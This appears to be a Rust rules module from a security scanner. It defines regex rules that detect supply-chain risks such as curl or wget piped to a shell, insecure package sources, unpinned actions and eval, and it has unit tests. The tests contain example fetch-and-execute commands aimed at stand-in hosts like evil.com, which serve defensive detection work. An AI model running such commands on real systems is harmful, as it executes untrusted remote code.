use crate::rules::types::{Category, Confidence, Rule, Severity};
use regex::Regex;

pub fn rules() -> Vec<Rule> {
    vec![
        sc_001(),
        sc_002(),
        sc_003(),
        sc_004(),
        sc_005(),
        sc_006(),
        sc_007(),
        sc_008(),
    ]
}

fn sc_001() -> Rule {
    Rule {
        id: "SC-001",
        name: "Remote script execution via curl",
        description: "Detects curl piped to shell, a common supply chain attack vector",
        severity: Severity::Critical,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // curl | bash/sh/zsh (basic)
            Regex::new(r"curl\s+[^|]*\|\s*(bash|sh|zsh|dash)").expect("SC-001: invalid regex"),
            // curl | sudo bash/sh
            Regex::new(r"curl\s+[^|]*\|\s*sudo\s+.*\b(bash|sh|zsh)")
                .expect("SC-001: invalid regex"),
            // curl -s | bash
            Regex::new(r"curl\s+-[a-zA-Z]*s[a-zA-Z]*\s+[^|]*\|\s*(bash|sh|zsh)")
                .expect("SC-001: invalid regex"),
            // curl -sSL | bash (common installer pattern)
            Regex::new(r"curl\s+-[a-zA-Z]*[sS]+[a-zA-Z]*L?[a-zA-Z]*\s+[^|]*\|\s*(bash|sh|zsh)")
                .expect("SC-001: invalid regex"),
            // curl | python (also dangerous)
            Regex::new(r"curl\s+[^|]*\|\s*python").expect("SC-001: invalid regex"),
            // bash -c "$(curl ...)"
            Regex::new(r#"(bash|sh|zsh)\s+-c\s+["']?\$\(curl"#).expect("SC-001: invalid regex"),
            // source <(curl ...)
            Regex::new(r"source\s+<\(curl").expect("SC-001: invalid regex"),
            // . <(curl ...)
            Regex::new(r"\.\s+<\(curl").expect("SC-001: invalid regex"),
        ],
        exclusions: vec![
            // localhost is generally safe
            Regex::new(r"localhost|127\.0\.0\.1|::1").expect("SC-001: invalid regex"),
        ],
        message: "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
        recommendation: "Download the script first, review it, then execute. Use checksums to verify integrity.",
        fix_hint: Some(
            "curl -o install.sh URL && cat install.sh && sha256sum install.sh && bash install.sh",
        ),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn sc_002() -> Rule {
    Rule {
        id: "SC-002",
        name: "Remote script execution via wget",
        description: "Detects wget piped to shell, a common supply chain attack vector",
        severity: Severity::Critical,
        category: Category::SupplyChain,
        confidence: Confidence::Certain,
        patterns: vec![
            // wget -O- | bash/sh
            Regex::new(r"wget\s+[^|]*-O\s*-[^|]*\|\s*(bash|sh|zsh)")
                .expect("SC-002: invalid regex"),
            // wget -qO- | bash
            Regex::new(r"wget\s+[^|]*-[a-zA-Z]*q[a-zA-Z]*O\s*-[^|]*\|\s*(bash|sh|zsh)")
                .expect("SC-002: invalid regex"),
            // wget --quiet -O - | bash
            Regex::new(r"wget\s+[^|]*--quiet[^|]*-O\s+-[^|]*\|\s*(bash|sh|zsh)")
                .expect("SC-002: invalid regex"),
            // wget | sudo bash/sh
            Regex::new(r"wget\s+[^|]*\|\s*sudo\s+.*\b(bash|sh|zsh)")
                .expect("SC-002: invalid regex"),
            // bash -c "$(wget ...)"
            Regex::new(r#"(bash|sh|zsh)\s+-c\s+["']?\$\(wget"#).expect("SC-002: invalid regex"),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1|::1").expect("SC-002: invalid regex")],
        message: "Remote script execution via wget detected. This is a common supply chain attack vector.",
        recommendation: "Download the script first, review it, then execute. Use checksums to verify integrity.",
        fix_hint: Some(
            "wget -O install.sh URL && cat install.sh && sha256sum install.sh && bash install.sh",
        ),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn sc_003() -> Rule {
    Rule {
        id: "SC-003",
        name: "Untrusted package source",
        description: "Detects package installation from non-standard sources that may contain malicious code",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // pip install from HTTP (not HTTPS)
            Regex::new(r"pip3?\s+install\s+.*--index-url\s+http://")
                .expect("SC-003: invalid regex"),
            Regex::new(r"pip3?\s+install\s+.*-i\s+http://").expect("SC-003: invalid regex"),
            // pip install from git over HTTP
            Regex::new(r"pip3?\s+install\s+git\+http://").expect("SC-003: invalid regex"),
            // npm install from HTTP registry
            Regex::new(r"npm\s+.*--registry\s+http://").expect("SC-003: invalid regex"),
            // npm install from git URL (insecure protocol)
            Regex::new(r"npm\s+install\s+git://").expect("SC-003: invalid regex"),
            Regex::new(r"npm\s+install\s+git\+http://").expect("SC-003: invalid regex"),
            // yarn with HTTP registry
            Regex::new(r"yarn\s+.*--registry\s+http://").expect("SC-003: invalid regex"),
            // gem install from HTTP source
            Regex::new(r"gem\s+install\s+.*--source\s+http://").expect("SC-003: invalid regex"),
            // cargo install from git with HTTP
            Regex::new(r"cargo\s+install\s+--git\s+http://").expect("SC-003: invalid regex"),
            // pip install with --trusted-host (often used to bypass HTTPS)
            Regex::new(r"pip3?\s+install\s+.*--trusted-host").expect("SC-003: invalid regex"),
        ],
        exclusions: vec![
            // localhost/internal registries are often legitimate
            Regex::new(r"localhost|127\.0\.0\.1|::1").expect("SC-003: invalid regex"),
            // Private registries with common naming
            Regex::new(r"registry\.(internal|corp|local)").expect("SC-003: invalid regex"),
        ],
        message: "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
        recommendation: "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning.",
        fix_hint: Some("Use HTTPS: pip install --index-url https://pypi.org/simple/ package"),
        cwe_ids: &["CWE-829", "CWE-494", "CWE-319"],
    }
}

fn sc_004() -> Rule {
    Rule {
        id: "SC-004",
        name: "Untrusted GitHub Action",
        description: "Detects GitHub Actions from untrusted sources or without version pinning",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // Actions without version pinning (using branch names)
            Regex::new(r"uses:\s+[^@]+@master\b").expect("SC-004: invalid regex"),
            Regex::new(r"uses:\s+[^@]+@main\b").expect("SC-004: invalid regex"),
            Regex::new(r"uses:\s+[^@]+@latest\b").expect("SC-004: invalid regex"),
            // Actions with tag versions (v1, v2, etc.) - less safe than SHA
            Regex::new(r"uses:\s+[a-z0-9_-]+/[a-z0-9_-]+@v\d+").expect("SC-004: invalid regex"),
        ],
        exclusions: vec![
            // Well-known official actions
            Regex::new(r"uses:\s+actions/").expect("SC-004: invalid regex"),
            Regex::new(r"uses:\s+github/").expect("SC-004: invalid regex"),
            Regex::new(r"uses:\s+docker/").expect("SC-004: invalid regex"),
            // SHA pinned actions
            Regex::new(r"@[a-f0-9]{40}").expect("SC-004: invalid regex"),
        ],
        message: "GitHub Action from potentially untrusted source or without version pinning detected.",
        recommendation: "Pin actions to specific versions or SHA commits. Use only official or verified actions.",
        fix_hint: Some("Pin to SHA: uses: owner/action@sha256:abc123... or verified version"),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

fn sc_005() -> Rule {
    Rule {
        id: "SC-005",
        name: "Dynamic code evaluation",
        description: "Detects eval() or similar dynamic code execution that may run malicious code",
        severity: Severity::Critical,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // JavaScript/TypeScript eval
            Regex::new(r"\beval\s*\(").expect("SC-005: invalid regex"),
            // Python eval/exec
            Regex::new(r"\b(eval|exec)\s*\(").expect("SC-005: invalid regex"),
            // Ruby eval
            Regex::new(r"\binstance_eval|class_eval|module_eval").expect("SC-005: invalid regex"),
            // Shell eval
            Regex::new(r#"\beval\s+["'$]"#).expect("SC-005: invalid regex"),
            // new Function() in JavaScript
            Regex::new(r"new\s+Function\s*\(").expect("SC-005: invalid regex"),
            // setTimeout/setInterval with string
            Regex::new(r#"set(Timeout|Interval)\s*\(\s*["']"#).expect("SC-005: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"test|mock|example|spec").expect("SC-005: invalid regex"),
            // JSON.parse is safe
            Regex::new(r"JSON\.parse").expect("SC-005: invalid regex"),
        ],
        message: "Dynamic code evaluation detected. This may execute untrusted code.",
        recommendation: "Avoid eval() and dynamic code execution. Use safer alternatives.",
        fix_hint: Some("Replace eval() with JSON.parse() for data or static imports for code"),
        cwe_ids: &["CWE-94", "CWE-95"],
    }
}

fn sc_006() -> Rule {
    Rule {
        id: "SC-006",
        name: "Insecure download checksum bypass",
        description: "Detects downloads that skip or bypass checksum verification",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // --no-check-certificate
            Regex::new(r"--no-check-certificate").expect("SC-006: invalid regex"),
            // curl -k (insecure)
            Regex::new(r"curl\s+-[a-zA-Z]*k").expect("SC-006: invalid regex"),
            Regex::new(r"curl\s+--insecure").expect("SC-006: invalid regex"),
            // wget --no-check-certificate
            Regex::new(r"wget\s+--no-check-certificate").expect("SC-006: invalid regex"),
            // pip --trusted-host
            Regex::new(r"pip.*--trusted-host").expect("SC-006: invalid regex"),
            // npm strict-ssl false
            Regex::new(r"npm.*strict-ssl\s*=?\s*false").expect("SC-006: invalid regex"),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1").expect("SC-006: invalid regex")],
        message: "Insecure download with certificate/checksum bypass detected.",
        recommendation: "Enable certificate verification and verify checksums for downloads.",
        fix_hint: Some("Remove --insecure flags and verify checksums after download"),
        cwe_ids: &["CWE-295", "CWE-494"],
    }
}

fn sc_007() -> Rule {
    Rule {
        id: "SC-007",
        name: "Container image pull without digest",
        description: "Detects container images pulled without digest verification",
        severity: Severity::Medium,
        category: Category::SupplyChain,
        confidence: Confidence::Tentative,
        patterns: vec![
            // docker pull without @sha256
            Regex::new(r"docker\s+pull\s+[^@]+:[a-zA-Z0-9._-]+\s*$")
                .expect("SC-007: invalid regex"),
            // podman pull without @sha256
            Regex::new(r"podman\s+pull\s+[^@]+:[a-zA-Z0-9._-]+\s*$")
                .expect("SC-007: invalid regex"),
            // kubernetes image without digest
            Regex::new(r"image:\s*[^@]+:[a-zA-Z0-9._-]+\s*$").expect("SC-007: invalid regex"),
        ],
        exclusions: vec![
            // Digest-pinned images
            Regex::new(r"@sha256:").expect("SC-007: invalid regex"),
            // Local images
            Regex::new(r"localhost|127\.0\.0\.1").expect("SC-007: invalid regex"),
        ],
        message: "Container image pulled without digest verification. Image content may change.",
        recommendation: "Pin container images to SHA256 digests for reproducible builds.",
        fix_hint: Some("Use digest: docker pull image@sha256:abc123..."),
        cwe_ids: &["CWE-494", "CWE-1357"],
    }
}

fn sc_008() -> Rule {
    Rule {
        id: "SC-008",
        name: "NPX/Bunx remote execution",
        description: "Detects npx or bunx executing packages directly from the registry",
        severity: Severity::High,
        category: Category::SupplyChain,
        confidence: Confidence::Firm,
        patterns: vec![
            // npx without --yes flag prompting (dangerous if automated)
            Regex::new(r"npx\s+--yes\s").expect("SC-008: invalid regex"),
            Regex::new(r"npx\s+-y\s").expect("SC-008: invalid regex"),
            // bunx execution
            Regex::new(r"bunx\s+[a-z0-9@/_-]+").expect("SC-008: invalid regex"),
            // pnpm dlx
            Regex::new(r"pnpm\s+dlx\s").expect("SC-008: invalid regex"),
            // yarn dlx
            Regex::new(r"yarn\s+dlx\s").expect("SC-008: invalid regex"),
        ],
        exclusions: vec![
            // Well-known safe packages
            Regex::new(r"create-react-app|create-next-app|typescript|prettier|eslint")
                .expect("SC-008: invalid regex"),
            // Official MCP servers
            Regex::new(r"@modelcontextprotocol/").expect("SC-008: invalid regex"),
            Regex::new(r"@anthropic/").expect("SC-008: invalid regex"),
        ],
        message: "Remote package execution via npx/bunx detected. May execute untrusted code.",
        recommendation: "Install packages locally first, then run. Avoid executing remote packages directly.",
        fix_hint: Some("npm install package && npx package instead of npx --yes package"),
        cwe_ids: &["CWE-829", "CWE-494"],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sc_001_detects_curl_pipe_bash() {
        let rule = sc_001();
        let test_cases = vec![
            // Should detect
            ("curl https://evil.com/install.sh | bash", true),
            ("curl -s https://evil.com/script.sh | sh", true),
            ("curl -sSL https://get.evil.com | bash", true),
            (
                "curl -fsSL https://raw.githubusercontent.com/user/repo/main/install.sh | bash",
                true,
            ),
            (
                r#"bash -c "$(curl -fsSL https://evil.com/install.sh)""#,
                true,
            ),
            ("source <(curl -s https://evil.com/env.sh)", true),
            ("curl https://example.com/script.sh | python", true),
            // Should not detect
            ("curl https://api.github.com/repos", false),
            ("curl -o file.sh https://example.com/script.sh", false),
            ("curl http://localhost:3000/script.sh | bash", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_sc_002_detects_wget_pipe_bash() {
        let rule = sc_002();
        let test_cases = vec![
            // Should detect
            ("wget -O- https://evil.com/install.sh | bash", true),
            ("wget -qO- https://evil.com/script.sh | sh", true),
            ("wget --quiet -O - https://evil.com/install.sh | bash", true),
            (
                r#"bash -c "$(wget -qO- https://evil.com/install.sh)""#,
                true,
            ),
            // Should not detect
            ("wget https://example.com/file.tar.gz", false),
            ("wget -O script.sh https://example.com/script.sh", false),
            ("wget -O- http://localhost:8080/script.sh | bash", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_sc_003_detects_untrusted_package_sources() {
        let rule = sc_003();
        let test_cases = vec![
            // Should detect (HTTP sources)
            (
                "pip install --index-url http://evil.com/simple package",
                true,
            ),
            ("pip install -i http://malicious-pypi.com/ package", true),
            ("pip install git+http://github.com/user/repo.git", true),
            ("npm install --registry http://evil.com package", true),
            ("npm install git://github.com/user/malicious-repo.git", true),
            ("gem install --source http://evil.com package", true),
            ("cargo install --git http://github.com/user/repo", true),
            ("pip install --trusted-host evil.com package", true),
            // Should not detect (safe patterns)
            ("pip install requests", false),
            (
                "pip install --index-url https://pypi.org/simple/ package",
                false,
            ),
            ("npm install express", false),
            (
                "npm install --registry https://registry.npmjs.org package",
                false,
            ),
            ("pip install -i http://localhost:8080/simple package", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_sc_001_common_installer_patterns() {
        let rule = sc_001();
        // Common installer patterns that should be detected
        let installers = vec![
            "curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -",
            "curl -sSL https://install.python-poetry.org | python3 -",
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
        ];

        for installer in installers {
            let matched = rule.patterns.iter().any(|p| p.is_match(installer));
            assert!(matched, "Should detect installer pattern: {}", installer);
        }
    }

    #[test]
    fn test_sc_003_allows_https_sources() {
        let rule = sc_003();
        // HTTPS sources should NOT trigger
        let safe_commands = vec![
            "pip install --index-url https://pypi.org/simple/ package",
            "pip install -i https://custom-pypi.company.com/simple/ package",
            "npm install --registry https://registry.npmjs.org package",
            "npm install --registry https://npm.pkg.github.com package",
            "gem install --source https://rubygems.org package",
            "cargo install --git https://github.com/user/repo",
        ];

        for cmd in safe_commands {
            let matched = rule.patterns.iter().any(|p| p.is_match(cmd));
            assert!(!matched, "Should NOT detect HTTPS source: {}", cmd);
        }
    }

    // Snapshot tests
    #[test]
    fn snapshot_sc_001() {
        let rule = sc_001();
        let content = include_str!("../../../tests/fixtures/rules/sc_001.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("sc_001", findings);
    }

    #[test]
    fn snapshot_sc_002() {
        let rule = sc_002();
        let content = include_str!("../../../tests/fixtures/rules/sc_002.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("sc_002", findings);
    }

    #[test]
    fn snapshot_sc_003() {
        let rule = sc_003();
        let content = include_str!("../../../tests/fixtures/rules/sc_003.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("sc_003", findings);
    }
}
